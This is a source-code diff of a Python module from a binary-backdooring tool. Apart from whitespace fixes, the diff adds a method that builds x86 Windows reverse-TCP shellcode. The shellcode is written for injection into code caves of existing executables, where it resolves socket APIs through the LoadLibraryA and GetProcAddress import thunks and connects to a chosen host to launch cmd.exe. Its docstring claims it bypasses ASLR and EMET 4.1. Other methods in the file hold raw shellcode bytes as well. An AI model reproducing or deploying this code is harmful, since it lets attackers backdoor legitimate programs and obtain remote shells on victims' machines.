@@ -1,6 +1,6 @@
 '''
     Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-    
+
     Copyright (C) 2013,2014, Joshua Pitts
 
     License:   GPLv3
@@ -31,6 +31,7 @@
 import sys
 import struct
 from intelmodules import eat_code_caves
+
 
 class winI32_shellcode():
     """
@@ -205,15 +206,14 @@ class winI32_shellcode():
         #else:
         #    self.shellcode1 += "\x89\x00\x00\x00"
 
-        self.shellcode1 += ("\x90"*40
+        self.shellcode1 += ("\x90" * 40
                             )
 
-        self.shellcode2 = ("\x90" *48
+        self.shellcode2 = ("\x90" * 48
                            )
 
         self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
         return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)
-    
 
     def user_supplied_shellcode(self, flItms, CavesPicked={}):
         """
@@ -230,7 +230,7 @@ class winI32_shellcode():
             self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
 
         breakupvar = eat_code_caves(flItms, 0, 1)
-        
+
         self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                            "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                            "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
@@ -319,7 +319,7 @@ class winI32_shellcode():
         self.shellcode2 += self.supplied_shellcode
         self.shellcode1 += "\xe9"
         self.shellcode1 += struct.pack("<I", len(self.shellcode2))
-        
+
         self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
         return (self.stackpreserve + self.shellcode1, self.shellcode2)
 
@@ -356,10 +356,10 @@ class winI32_shellcode():
         self.shellcode1 += "\xBE"
         self.shellcode1 += struct.pack("<H", 361 + len(self.HOST))
         self.shellcode1 += "\x00\x00"  # <---Size of shellcode2 in hex
-        self.shellcode1 +=  ("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
-                           "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
-                           "\x89\xF1"
-                           )
+        self.shellcode1 += ("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
+                            "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
+                            "\x89\xF1"
+                            )
 
         if flItms['cave_jumping'] is True:
             self.shellcode1 += "\xe9"
@@ -516,4 +516,128 @@ class winI32_shellcode():
         self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
         return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)
 
+    def loadliba_reverse_tcp(self, flItms, CavesPicked={}):
+        """
+        Position dependent shellcode that uses API thunks of LoadLibraryA and
+        GetProcAddress to find and load APIs for callback to C2.
+        Bypasses EMET 4.1. Idea from Jared DeMott:
+        http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/
+        via @bannedit0 (twitter handle)
+        """
+        if self.PORT is None:
+            print ("Must provide port")
+            sys.exit(1)
 
+        if 'LoadLibraryA' not in flItms:
+            print "[!] Binary does not have the LoadLibraryA API in IAT"
+            return False
+
+        if 'GetProcAddress' not in flItms:
+            print "[!] Binary does not have GetProcAddress API in IAT"
+            return False
+
+        #### BEGIN ASLR BYPASS ####
+        # This works because we know the original entry point of the application and
+        # where we are supposed to be as we control where our shellcode goes
+        self.shellcode1 = "\xfc"   # CLD
+        self.shellcode1 += "\xbb"  # mov value below ebx
+
+        if flItms['NewCodeCave'] is True:
+            if 'CodeCaveVirtualAddress' in flItms:
+
+                #Current address if not in ASLR
+                self.shellcode1 += struct.pack("<I", (flItms['CodeCaveVirtualAddress'] +
+                                                      len(self.shellcode1) +
+                                                      len(self.stackpreserve) +
+                                                      flItms['buffer'] + 201
+                                                      )
+                                               )
+            else:
+                self.shellcode += '\x00x\x00\x00\x00'
+        else:
+            if flItms['CavesPicked'] == {}:
+                self.shellcode1 += '\x00\x00\x00\x00'
+            else:
+                for section in flItms['Sections']:
+                    if section[0] == flItms['CavesPicked'][0][0]:
+                        VirtualLOCofSection = section[2]
+                        diskLOCofSection = section[4]
+
+                #Current address if not in ASLR
+                self.shellcode1 += struct.pack("<I", int(flItms['CavesPicked'][0][1], 16) -
+                                               diskLOCofSection +
+                                               VirtualLOCofSection +
+                                               flItms['ImageBase'] +
+                                               len(self.shellcode1) +
+                                               len(self.stackpreserve) +
+                                               9)
+
+        self.shellcode1 += "\xe8\x00\x00\x00\x00"
+        self.shellcode1 += "\x5e"           # pop esi
+        self.shellcode1 += "\x2b\xf3"       # sub esi,ebx
+        self.shellcode1 += "\x83\xfe\x00"   # cmp esi,0
+        self.shellcode1 += "\xbb"           # mov value below to EBX
+        self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'])
+        self.shellcode1 += "\xb9"  # mov value below to ECX
+        self.shellcode1 += struct.pack("<I", flItms['GetProcAddress'])
+        # Don't jump if in ASLR env
+        self.shellcode1 += "\x74\x15"  # JZ (XX) # Jump to location after ALSR check
+        #Find the base addr
+        #Base address difference now in ESI
+        self.shellcode1 += "\xb8"  # mov eax, Normal imagebase
+        self.shellcode1 += struct.pack("<I", flItms['ImageBase'])
+        self.shellcode1 += "\x03\xc6"   # add eax, esi  # NOW YOU HAVE ASLR IMAGEBASE in EAX
+        self.shellcode1 += "\xbb"       # mov ebx, the loadlibA offset
+        self.shellcode1 += struct.pack("<I", flItms['LoadLibraryAOffset'])
+        self.shellcode1 += "\xb9"       # mov ecx, the getprocaddr offset
+        self.shellcode1 += struct.pack("<I", flItms['GetProcAddressOffset'])
+        self.shellcode1 += "\x03\xd8"   # add ebx, eax  #EBX will hold LoadlibAoffset
+        self.shellcode1 += "\x01\xc1"   # add ecx, eax  #ECX will hold Getprocaddress
+
+        ####END ASLR BYPASS####
+
+        self.shellcode1 += ("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68"
+                            "\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50"
+                            "\x97\xFF\x16\x95\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\xFF\xD5\x68"
+                            "\x74\x41\x00\x00\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x57"
+                            "\xFF\x16\x95\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\xD5\x95"
+                            "\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x57\xFF\x16\x87\xCD"
+                            "\x95\x6A\x05\x68")
+        self.shellcode1 += self.pack_ip_addresses()          # HOST
+        self.shellcode1 += "\x68\x02\x00"
+        self.shellcode1 += struct.pack('!h', self.PORT)      # PORT
+        self.shellcode1 += ("\x89\xE2\x6A"
+                            "\x10\x52\x51\x87\xF9\xFF\xD5"
+                            )
+
+        #breakupvar is the distance between codecaves
+        breakupvar = eat_code_caves(flItms, 0, 1)
+
+        if flItms['cave_jumping'] is True:
+            self.shellcode1 += "\xe9"  # JMP opcode
+            if breakupvar > 0:
+                if len(self.shellcode1) < breakupvar:
+                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
+                                                                 len(self.shellcode1) - 4).rstrip("L")), 16))
+                else:
+                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
+                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
+            else:
+                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
+                                                   len(self.shellcode1) - 3)
+
+        self.shellcode2 = ("\x85\xC0\x74\x00\x6A\x00\x68\x65\x6C"
+                           "\x33\x32\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x73\x41\x00\x00\x68"
+                           "\x6F\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x50"
+                           "\xFF\x16\x95\x93\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x87\xFE"
+                           "\x92\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01"
+                           "\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56"
+                           "\x56\x53\x56\x87\xDA\xFF\xD5\x89\xE6\x6A\x00\x68\x65\x6C\x33\x32"
+                           "\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x65\x63\x74\x00\x68\x65\x4F"
+                           "\x62\x6A\x68\x69\x6E\x67\x6C\x68\x46\x6F\x72\x53\x68\x57\x61\x69"
+                           "\x74\x54\x50\x95\xFF\x17\x95\x89\xF2\x31\xF6\x4E\x56\x46\x89\xD4"
+                           "\xFF\x32\x96\xFF\xD5\x81\xC4\x34\x02\x00\x00"
+                           )
+
+        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
+        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)
